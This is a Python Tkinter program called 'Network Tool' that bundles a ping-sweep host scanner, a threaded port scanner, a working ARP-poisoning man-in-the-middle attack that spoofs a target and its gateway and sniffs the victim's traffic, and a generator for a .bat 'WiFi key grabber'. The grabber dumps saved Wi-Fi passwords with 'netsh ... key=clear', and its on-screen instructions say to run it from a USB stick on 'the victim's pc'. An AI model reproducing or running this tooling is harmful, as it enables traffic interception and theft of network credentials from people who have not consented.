import os, os.path
from os import listdir, system
from os.path import isfile, join
import tkinter as tk
import tkinter.ttk as ttk
from tkinter import filedialog, messagebox
from tkinter import *
import time
from datetime import datetime
import threading
from socket import *
import scapy.all as scapy
import argparse
import sys

import netifaces


global be_verbose
be_verbose=0
global fast
fast = "n"
##global ipaddr, st1, en1, ver
##ipaddr="0.0.0.0"
##st1="0"
##en1="255"
##ver="n"

global captured_host
captured_host=[]

global sniff_V
sniff_v=False


def NetworkScanner(ipaddr, st1, en1, ver, out, start):
    global state_b
    #global ipaddr, st1, en1, ver
    net = ipaddr
    net1= net.split('.')
    a = '.'

    net2 = net1[0] + a + net1[1] + a + net1[2] + a
    #st1 = "START N"
    #en1 = "END N"
   
    en1 = en1 + 1

    verbose=ver

    ping1 = "ping -n 1 "

    t1 = datetime.now()
    #print ("Scanning in Progress:")
    out.insert(END, "Scanning in Progress...\n")

    def ping_ip(addr, v):
        ping1 = "ping -n 1 "
        arp1 = "arp -a "
        comm = ping1 + addr
        comm2 = arp1 + addr
        import socket
        hname=socket.getfqdn(str(addr))
        response = os.popen(comm)
        on=False
        for line in response.readlines():
           if (line.count("TTL")):
              on=True
              break
           else:
              pass
        if on==True:
            getmac = os.popen(comm2)
            mac=""
            for line in getmac.readlines():
                mac+=line
            mac=mac.split()
            try:
                mac=mac[10]
                #print ("[+]",addr, "--> Live\n\tMac address:",mac,"\n")
                out.insert(END, "[+] %s --> Live\n\tMac address: %s \n"%(addr, mac))
                out.insert(END, "\tHost Name: %s\n\n"%(hname))
                out.see("end")
                new=[addr, mac, hname]
                if new in captured_host:
                    pass
                else:
                    captured_host.append(new)
            except IndexError:
                #print ("[+]",addr, "--> Live\n")
                out.insert(END, "[+] %s --> Live (YOU)\n"%(addr))
                out.insert(END, "\tHost Name: %s\n\n"%(hname))
                out.see("end")
                
        if v=="y":
            #print ("[-]",addr, "--> Offline")
            out.insert(END, "[-] %s --> Offline\n"%(addr))
            out.see("end")
            
            
    addr_list=[]
    for ip in range(st1,en1):
        addr = net2 + str(ip)
        addr_list.append(addr)
    #addr_list.reverse()

    while (addr_list!=[]):
        for i in range(0,10):
            try:
                t = threading.Thread(target=ping_ip, args=(addr_list[0], verbose,))
                t.start()
                addr_list.pop(0)
                time.sleep(0.2)
            except IndexError:
                break



    time.sleep(5) 
    t2 = datetime.now()
    total = str(t2 - t1)
    total = total.replace("."," ")
    total = total.split()
    total = total[0]
    #print ("\nScanning completed in: ",total)
    out.insert(END, "\nScanning completed in: %s"%(total))
    out.see("end")
    start["state"]="normal"
#____________________________________________

def PortScanner(ipaddr, po1, po2, be_verbose, out, start):
    global port_c
    global fast
    port_c=[]
    tout=2
    def port_scanner(port, output, fast, tout):
        global port_c
        #global fast, tout
        s = socket(AF_INET, SOCK_STREAM)
        if fast=="y":
            s.settimeout(tout)
        conn = s.connect_ex((t_IP, port))
        if fast=="y":
            s.settimeout(None)
        if conn==0:
            #print("\t[+] Port %s: OPEN"%(port))
            out.insert(END, "\t[+] Port %s: OPEN\n"%(port))
            out.see("end")
            if port==21 or port==20:
                service="FTP"
            elif port==22:
                service="SSH"
            elif port==23:
                service="Telnet"
            elif port==25:
                service="SMTP"
            elif port==51 or port==50:
                service="IPSec"
            elif port==53:
                service="DNS"
            elif port==67 or port==68:
                service="DHCP"
            elif port==69:
                service="TFTP"
            elif port==80:
                service="HTTP"
            elif port==110:
                service="POP3"
            elif port==119:
                service="NNTP"
            elif port==123:
                service="NTP"
            elif port==135 or port==136 or port==137 or port==138 or port==139:
                service="NetBIOS"
            elif port==143:
                service="IMAP4"
            elif port==161 or port==162:
                service="SNMP"
            elif port==443:
                service="SSL"
            elif port==3389:
                service="RDP"
            else:
                service="Unknown"
            port_c.append([port,service])
        else:
            if output=="y":
                #print("[-] Port %s: CLOSED"%(port))
                out.insert(END, "[-] Port %s: CLOSED\n"%(port))
                out.see("end")
        s.close()
    

    target = ipaddr
    t_IP = gethostbyname(target)
    #print("Enter the range of port to be scanned ")
    port_min = po1
    port_max = po2
    port_max+=1
    #n_thread = int(input("Enter the number of thread to use (1-10): "))
    #while (n_thread<=0 or n_thread>=11):
    #    n_thread = int(input("Enter the number of thread to use (1-10): "))
    #fast = str(input("Fast mode? [y/n]: "))
    fastt = fast
        
    output = be_verbose

    #startTime = time.time()
    startTime = datetime.now()
    #print("Checking if host is up...")
    out.insert(END, "Checking if host is up...\n")
    response_time = time.time()
    response_ping=os.popen('ping -n 1 ' + target)
    response_time = round((time.time() - response_time),2)
    if response_ping==1:
        #print("[-] The host %s is down"%(target))
        out.insert(END, "[x] The host %s is down\n"%(target))
    else:
        #print("[+] The host %s is up\n"%(target))
        out.insert(END, "[+] The host %s is up\n"%(target))
        #print("[*]Testing port...\n")
        out.insert(END, "[*]Testing port...\n")
        response_time = time.time()
        s = socket(AF_INET, SOCK_STREAM)
        if fastt=="y":
            s.settimeout(tout)
        conn = s.connect_ex((t_IP, 22))
        if fastt=="y":
            s.settimeout(None)
        response_time = round((time.time() - response_time),2)
        now = datetime.now()
        current_time = now.strftime("%H:%M")
        #print("Host: %s"%(t_IP))
        out.insert(END, "Host: %s\n"%(t_IP))
        #print("Starting at %s"%(current_time))
        out.insert(END, "Starting at %s\n"%(current_time))
        est_time = round(((response_time*(port_max-port_min))/20), 0)
        m_e_t = str(round((est_time+5)/60,2))
        #m_e_t = m_e_t.replace(".",":")
        #print("Estimated time: %s m\n"%(m_e_t))
        out.insert(END, "Estimated time: %s m\n"%(m_e_t))
        #print(response_time)
        #print ('Starting scanning host...\n')
        out.insert(END, 'Starting scanning host...\n')
        port_list=[]
        for port in range(port_min, port_max):
            port_list.append(port)
            
        port_list1=[]
        port_list2=[]
        port_list3=[]
        three=int(len(port_list)/3)
        en=int(len(port_list))
        for port in port_list[:three]:
            port_list1.append(port)
        for port in port_list[three:three+three]:
            port_list2.append(port)
        for port in port_list[three+three:en]:
            port_list3.append(port)
            
        def split(port_list):
            while (port_list!=[]):
                for i in range(0,20):
                    try:
                        tr = threading.Thread(target=port_scanner, args=(port_list[0], output, fastt, tout))
                        tr.start()
                        port_list.pop(0)
                        time.sleep(0.4)
                        if i==19:
                            tr.join()
                    except IndexError:
                        break
        t1 = threading.Thread(target=split, args=(port_list1,))
        t1.start()
        t2 = threading.Thread(target=split, args=(port_list2,))
        t2.start()
        t3 = threading.Thread(target=split, args=(port_list3,))
        t3.start()

        t1.join()
        t2.join()
        t3.join()
        time.sleep(7)
        if port_c != []:
            out.insert(END, "-------------------------\n")
            out.insert(END, "##\tPORT\tSERVICE\n")
            c=0
            for p in port_c:
                out.insert(END, "%s\t%s\t%s\n"%(c,p[0],p[1]))
                c+=1
            out.insert(END, "-------------------------\n")
            out.see("end")
        else:
            out.insert(END, "\n\nThere are no open ports")
        #print('Time taken:', int(time.time() - startTime), "s")
        endTime = datetime.now()
        total = str(endTime - startTime)
        total = total.replace("."," ")
        total = total.split()
        total = total[0]
        out.insert(END, '\nScanned %s ports\nTime taken: %s s'%(en, total))
        out.see("end")
        start["state"]="normal"

#____________________________________________
global show_arp
show_arp=False
global show_dns
show_dns=False
global show_tcp
show_tcp=False
global show_udp
show_udp=False
global show_other
show_other=False

def ArpPoisoningAttack(target, gateway, out2, attack):
    global sniff_v
    def spoofer(targetIP, spoofIP, out2):
        global captured_host
        mac1=""
        exist=False
        for host in captured_host:
            if host[0]==targetIP:
                mac1=host[1]
                exist=True
                break
        try:
            if exist==False:
                arp1 = "arp -a "
                comm2 = arp1 + targetIP
                getmac = os.popen(comm2)
                mac=""
                for line in getmac.readlines():
                    mac+=line
                mac=mac.split()
                mac1=mac[10]
                new=[targetIP, mac]
                if new in captured_host:
                    pass
                else:
                    captured_host.append(new)
                
            
            destinationMac=mac1
        
            packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
            scapy.send(packet, verbose=False)
        except Exception:
            #print("error")
            out2.insert(END, "\n[x] ERROR\n")

    def restore(destinationIP, sourceIP):
        
        def getMac(dest):
            global captured_host
            mac=""
            for host in captured_host:
                if host[0]==dest:
                    mac=host[1]
                    break
            return mac
        
        def getSourceMac(source):
            global captured_host
            mac=""
            for host in captured_host:
                if host[0]==source:
                    mac=host[1]
                    break
            return mac
        packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=getSourceMac(sourceIP))
        scapy.send(packet, count=4,verbose=False)


    packets = 0
    targetIP=target
    gatewayIP=gateway
    
    def sniff_packet(out2, ip_addr):
        global show_dns, show_tcp, show_udp, show_arp, show_other
        from scapy.all import sniff
        global sniff_v
        while sniff_v:
            cap = sniff(count=1, filter="host %s"%(ip_addr))
            for c in cap:
                p=str(c.summary())
                p=p.split()
                if (p[2]=="IP" and p[4]=="TCP"):
                    #print("[IP/TCP] - %s > %s\n"%(p[5], p[7]))
                    if show_tcp==True:
                        out2.insert(END, "[IP/TCP] - %s > %s\n\n"%(p[5], p[7]))
                        out2.see("end")
                elif (p[2]=="IP" and p[4]=="UDP" and p[6]=="DNS"):
                    #print("[IP/UDP/DNS] %s %s\n"%(p[7], p[8]))
                    if show_dns==True:
                        out2.insert(END, "[IP/UDP/DNS] %s %s\n\n"%(p[7], p[8]))
                        out2.see("end")
                elif (p[2]=="IP" and p[4]=="UDP"):
                    #print("[IP/UDP] %s > %s\n"%(p[5], p[7]))
                    if show_udp==True:
                        out2.insert(END, "[IP/UDP] %s > %s\n\n"%(p[5], p[7]))
                        out2.see("end")
                elif (p[2]=="ARP"):
                    #print("[ARP] - who has %s says %s\n"%(p[5],p[7]))
                    if show_arp==True:
                        out2.insert(END, "[ARP] - who has %s says %s\n\n"%(p[5],p[7]))
                        out2.see("end")
                elif (p[2]=="IPv6" and p[4]=="UDP"):
                    #print("[IPv6/UDP] %s > %s\n"%(p[5], p[7]))
                    if show_other==True:
                        out2.insert(END, "[IPv6/UDP] %s > %s\n\n"%(p[5], p[7]))
                        out2.see("end")
                else:
                    if show_other==True:
                        out2.insert(END, "%s\n\n"%(p))
                        out2.see("end")
            
    out2.insert(END, "[+] Starting attack...\n")
    out2.see("end")
    while True:
        if attack["text"]=="Attack":
            sniff_v=False
            break
        else:
            spoofer(targetIP,gatewayIP, out2)
            spoofer(gatewayIP,targetIP, out2)
            #print("\r[+] Sent packets "+ str(packets))
            #out2.insert(END, "[+] Sent packets %s\n"%(str(packets)))
            #out2.see("end")
            sys.stdout.flush()
            packets +=2
            time.sleep(2)
            if sniff_v==False:
                sniff_v=True
                sn = threading.Thread(target=sniff_packet, args=(out2,target,))
                sn.start()
    #print("\nInterrupted Spoofing------------ Restoring to normal state..")
    time.sleep(2.5)
    out2.insert(END, "\n[*] Interrupted Spoofing (%s packets)\n[*] Restoring to normal state..."%(packets))
    out2.see("end")
    try:
        restore(targetIP,gatewayIP)
        restore(gatewayIP,targetIP)
    except Exception:
        out2.insert(END, "\n[x] Can't restore to normal state\n")
    out2.insert(END, "\n[+] Attack finished")
    out2.see("end")
    

#____________________________________________
global table_on
table_on=False
#global wifi_g
#wifi_g=False

def main():
    root=tk.Tk()
    root.title("Network Tool")
    root.geometry("950x700")
    root.config(bg="gray")
    nscan=Frame(root, bg="gray")
    mscan=Frame(root, bg="gray")
    arp_a=Frame(root, bg="gray")
    r_table=Frame(root, bg="darkgray")
    #tool_1=Frame(root, bg="gray")
    def menu_callback2():
        print("coming soon")
    def menu_callback():
        global captured_host, table_on
        if table_on==False:
            table_on=True
            null=Label(r_table, text=" ", bg="darkgray")
            null.pack(padx=280, pady=140)
            
            txt="IP ADDRESS\t\t\tMAC ADDRESS\t\t\tHOST NAME\n"
            txt+="-"*104
            txt+="\n"
            if captured_host==[]:
                pass
            else:
                for host in captured_host:
                    txt+="%s\t\t\t%s\t\t\t%s\n"%(host[0],host[1],host[2])
            
            labelframe_widget = tk.LabelFrame(r_table,text="Host Table", bg="darkgray",font=("Courier CE",12))
            label_widget=Text(labelframe_widget, height=15, width=65,bg="darkgray",font=("Courier CE",11))
            labelframe_widget.place(x=10, y=10)
            label_widget.pack()
            label_widget.insert(END, txt)
            
            r_table.place(x=100, y=150)
        else:
            r_table.place_forget()
            table_on=False
    def submenu_callback1():
        tool_1=tk.Tk()
        tool_1.geometry("700x400")
        tool_1.config(bg="gray")
        labl=Label(tool_1, text="Description:", bg="gray",font=("Courier CE",13))
        labl.place(x=10, y=10)
        lab2=Label(tool_1, text="This tool generate a wifi password grabber with extension .bat", bg="gray",font=("Courier CE",10))
        lab2.place(x=10, y=30)
        lab3=Label(tool_1, text="Put the file into a USB pendrive. When you put the USB into the victim's pc, double click the file .bat \nand wait for the prompt window to close.\n Then you can unplug the USB from the victim pc. On the USB you'll find a file 'output.txt' with the passwords.", bg="gray",font=("Courier CE",10))
        lab3.place(x=10, y=50)
        def gen_grabber():
            #comm=for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear | find/I "Nome SSID"
            comm1="for /f %s %s in ('netsh wlan show profiles') do @echo %s | findstr -i -v echo | netsh wlan show profiles %s key=clear | find/I %s"%('"skip=9 tokens=1,2 delims=:"',"%i","%j","%j", '"Nome SSID"')
            comm="netsh wlan show profiles"
            output = os.popen(comm)
            output=output.readlines()
            output=output[9]
            #output=output.replace("  ","")
            output=output.split()
            find1=False
            output2=""
            #print(output)
            for c in output:
                if find1==True:
                    output2+=c
                if c==":":
                    find1=True
            comm="netsh wlan show profiles %s key=clear"%(output2)
            output=os.popen(comm)
            output=output.readlines()
            nssid=output[21]

            find1=False
            output2=""
            for c in nssid:
                if c==":":
                    find1=True
                if find1==False:
                    output2+=c
            nssid=output2.replace("  ","")
            nkey=output[33]
            
            find1=False
            output2=""
            for c in nkey:
                if c==":":
                    find1=True
                if find1==False:
                    output2+=c
            nkey=output2.replace("  ","")
            
            nssid='"%s"'%(nssid)
            nkey='"%s"'%(nkey)
            #print(nssid+"\n"+nkey)
            comm1="for /f %s %s in ('netsh wlan show profiles') do @echo %s | findstr -i -v echo | netsh wlan show profiles %s key=clear | find/I %s"%('"skip=9 tokens=1,2 delims=:"',"%%i","%%j","%%j", nssid)
            comm2="for /f %s %s in ('netsh wlan show profiles') do @echo %s | findstr -i -v echo | netsh wlan show profiles %s key=clear | find/I %s"%('"skip=9 tokens=1,2 delims=:"',"%%i","%%j","%%j", nkey)
            file=open("password_grabber.bat","w")
            file.write("""
@echo off
call :sub >output.txt
exit /b

:sub
%s
%s
"""%(comm1, comm2))
            file.close()
            lab4=Label(tool_1, text="'password_grabber.bat' generated", bg="gray",font=("Courier CE",11), fg="darkgreen")
            lab4.place(x=10, y=250)
            
        gen=Button(tool_1, text="Generate", command=gen_grabber ,font=("Courier",12))
        gen.place(x=200,y=200, width=100,height=30)
                        
        
        
    def submenu_callback():
        print("coming soon")
        
    menu_widget = tk.Menu(root)
    submenu_widget = tk.Menu(menu_widget, tearoff=False)
    submenu_widget.add_command(label="WiFi key grabber",command=submenu_callback1)
    submenu_widget.add_command(label="coming soon",command=submenu_callback)
    menu_widget.add_command(label="Host Table", command=menu_callback)
    menu_widget.add_cascade(label="Other tools",menu=submenu_widget)
    menu_widget.add_command(label="Info",command=menu_callback2)
    root.config(menu=menu_widget)

    def select():
        global state_b, be_verbose
        #print(radioValue.get())
        if radioValue.get()==1:
            mscan.place_forget()
            be_verbose=0

            #_______ARP____
            def cArp():
                if checkArp.get()==1:
                    def get_arp():
                        if attack["text"]=="Attack":
                            target_ip=str(tar.get("1.0","end-1c"))
                            gateway_ip=str(gate.get("1.0","end-1c"))
                            out2.delete("1.0","end")
                            attack["text"]="Stop"
                            
                            ar = threading.Thread(target=ArpPoisoningAttack, args=(target_ip, gateway_ip, out2, attack))
                            ar.start()
                        elif attack["text"]=="Stop":
                            attack["text"]="Attack"

                    def update_globals():
                        global show_dns, show_tcp, show_udp, show_arp, show_other
                        if s_arp.get()==1:
                            show_arp=True
                        else:
                            show_arp=False
                        if s_dns.get()==1:
                            show_dns=True
                        else:
                            show_dns=False
                        if s_tcp.get()==1:
                            show_tcp=True
                        else:
                            show_tcp=False
                        if s_udp.get()==1:
                            show_udp=True
                        else:
                            show_udp=False
                        if s_other.get()==1:
                            show_other=True
                        else:
                            show_other=False
                        
                    null2=Label(arp_a, text=" ", bg="gray")
                    null2.pack(padx=200, pady=250)

                    lab1=Label(arp_a, text="Target address:", bg="gray")
                    lab1.config(font=("Courier CE",13))
                    lab1.place(x=0, y=0)

                    tar=Text(arp_a, height=1, width=18, bg="darkgray")
                    tar.place(x=120, y=0)

                    lab2=Label(arp_a, text="Gateway address:", bg="gray")
                    lab2.config(font=("Courier CE",13))
                    lab2.place(x=0, y=50)

                    gateways = netifaces.gateways()
                    default_gateway = gateways['default'][netifaces.AF_INET][0]
                    gate=Text(arp_a, height=1, width=18, bg="darkgray")
                    gate.place(x=140, y=50)
                    gate.insert(END, default_gateway)

                    attack=Button(arp_a, text="Attack", command=get_arp ,font=("Courier",12))
                    attack.place(x=100,y=100, width=100,height=30)

                    out2=Text(arp_a, height=23, width=55, bg="black", fg="white", font=("Courier",8))
                    out2.place(x=0, y=148)

                    lab3=Label(arp_a, text="Show:", bg="gray")
                    lab3.config(font=("Courier CE",13))
                    lab3.place(x=0, y=500)
                
                    s_arp=tk.IntVar()
                    s_dns=tk.IntVar()
                    s_udp=tk.IntVar()
                    s_tcp=tk.IntVar()
                    s_other=tk.IntVar()

                    s1 = Checkbutton(arp_a, text="ARP", variable=s_arp, onvalue=1, offvalue=0, command=update_globals)
                    s1.place(x=50, y=500)
                    s2 = Checkbutton(arp_a, text="DNS", variable=s_dns, onvalue=1, offvalue=0, command=update_globals)
                    s2.place(x=100, y=500)
                    s3 = Checkbutton(arp_a, text="UDP", variable=s_udp, onvalue=1, offvalue=0, command=update_globals)
                    s3.place(x=150, y=500)
                    s4 = Checkbutton(arp_a, text="TCP", variable=s_tcp, onvalue=1, offvalue=0, command=update_globals)
                    s4.place(x=200, y=500)
                    s5 = Checkbutton(arp_a, text="OTHER", variable=s_other, onvalue=1, offvalue=0, command=update_globals)
                    s5.place(x=250, y=500)
                    
                    arp_a.place(x=552, y=150)
                    
                    
                else:
                    arp_a.place_forget()
                    
            checkArp = tk.IntVar()
            a_button = Checkbutton(nscan, text="Arp Poisoning", variable=checkArp, onvalue=1, offvalue=0, command=cArp)
            a_button.place(x=700, y=100)

            #______________
            
            def cverbose():
                global be_verbose
                if checkValue.get()==1:
                    be_verbose="y"
                else:
                    be_verbose="n"

            def get_data():
                global be_verbose
                ipaddr=str(net.get("1.0","end-1c"))
                ip1=int(sta1.get("1.0","end-1c"))
                ip2=int(end1.get("1.0","end-1c"))
                out.delete("1.0","end")
                start["state"]="disabled"
                #NetworkScanner(ipaddr, ip1, ip2, be_verbose)
                sc = threading.Thread(target=NetworkScanner, args=(ipaddr, ip1, ip2, be_verbose,out,start,))
                sc.start()
                #out=Text(root, height=30, width=50, bg="black")
                #out.place(x=10, y=380)
                
            lab3=Label(nscan, text="Output:", bg="gray")
            lab3.config(font=("Courier CE",12))
            lab3.place(x=10, y=350)
            
            out=Text(nscan, height=15, width=65, bg="black", fg="white")
            out.place(x=10, y=380)
            
            null1=Label(nscan, text=" ", bg="gray")
            null1.pack(padx=500, pady=300)
            lab1=Label(nscan, text="Network Address:", bg="gray")
            lab1.config(font=("Courier CE",13))
            lab1.place(x=10, y=200)
            #lab1.pack(padx=200)
            
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET][0]
            #print(default_gateway)
            
            net=Text(nscan, height=1, width=18, bg="darkgray")
            net.place(x=150, y=200)
            net.insert(END, default_gateway)
            
            
            lab2=Label(nscan, text="IP range:          to", bg="gray")
            lab2.config(font=("Courier CE",13))
            lab2.place(x=10, y=240)
            sta1=Text(nscan, height=1, width=3, bg="darkgray")
            sta1.place(x=90, y=240)
            end1=Text(nscan, height=1, width=3, bg="darkgray")
            end1.place(x=150, y=240)
            
            checkValue = tk.IntVar()

            verbose=tk.Checkbutton(nscan, text='Be verbose',variable=checkValue, onvalue=1, offvalue=0, command=cverbose, bg="darkgray")
            verbose.place(x=10, y=280)


            start=Button(nscan, text="Start",bg="lightgreen", command=get_data ,font=("Courier",12))
            start.place(x=350,y=240, width=100,height=30)

            nscan.place(x=0, y=0)


            
        elif radioValue.get()==2:    
            nscan.place_forget()
            arp_a.place_forget()
            be_verbose=0

            def cverbose():
                global be_verbose
                if checkValue.get()==1:
                    be_verbose="y"
                else:
                    be_verbose="n"

            def cfast():
                global fast
                if checkValue2.get()==1:
                    fast="y"
                else:
                    fast="n"

            def get_data():
                global be_verbose
                ipaddr=str(net.get("1.0","end-1c"))
                po1=int(sta1.get("1.0","end-1c"))
                po2=int(end1.get("1.0","end-1c"))
                out.delete("1.0","end")
                start["state"]="disabled"
                #NetworkScanner(ipaddr, ip1, ip2, be_verbose)
                sc = threading.Thread(target=PortScanner, args=(ipaddr, po1, po2, be_verbose, out, start,))
                sc.start()
                #out=Text(root, height=30, width=50, bg="black")
                #out.place(x=10, y=380)
                
            lab3=Label(mscan, text="Output:", bg="gray")
            lab3.config(font=("Courier CE",12))
            lab3.place(x=10, y=350)
            
            out=Text(mscan, height=15, width=55, bg="black", fg="white")
            out.place(x=10, y=380)
            
            null1=Label(mscan, text=" ", bg="gray")
            null1.pack(padx=300, pady=300)
            lab1=Label(mscan, text="IP Address:", bg="gray")
            lab1.config(font=("Courier CE",13))
            lab1.place(x=10, y=200)
            #lab1.pack(padx=200)
            net=Text(mscan, height=1, width=18, bg="darkgray")
            net.place(x=110, y=200)
            
            
            lab2=Label(mscan, text="Port range:           to", bg="gray")
            lab2.config(font=("Courier CE",13))
            lab2.place(x=10, y=240)
            sta1=Text(mscan, height=1, width=5, bg="darkgray")
            sta1.place(x=100, y=240)
            end1=Text(mscan, height=1, width=5, bg="darkgray")
            end1.place(x=170, y=240)
            
            checkValue = tk.IntVar()
            checkValue2 = tk.IntVar()

            verbose=tk.Checkbutton(mscan, text='Be verbose',variable=checkValue, onvalue=1, offvalue=0, command=cverbose, bg="darkgray")
            verbose.place(x=10, y=280)
            fastmode=tk.Checkbutton(mscan, text='Fast scan',variable=checkValue2, onvalue=1, offvalue=0, command=cfast, bg="darkgray")
            fastmode.place(x=100, y=280)

            start=Button(mscan, text="Start",bg="lightgreen", command=get_data ,font=("Courier",12))
            start.place(x=350,y=240, width=100,height=30)

            mscan.place(x=0, y=0)



    radioValue = tk.IntVar() 
 
    rdioOne = tk.Radiobutton(root, text='Net Scan',
                                 variable=radioValue, value=1, command=select) 
    rdioTwo = tk.Radiobutton(root, text='Port Scan',
                                 variable=radioValue, value=2, command=select) 


    rdioOne.place(x=50, y=100)
    rdioTwo.place(x=150, y=100)
   

    root.mainloop()
    

main()
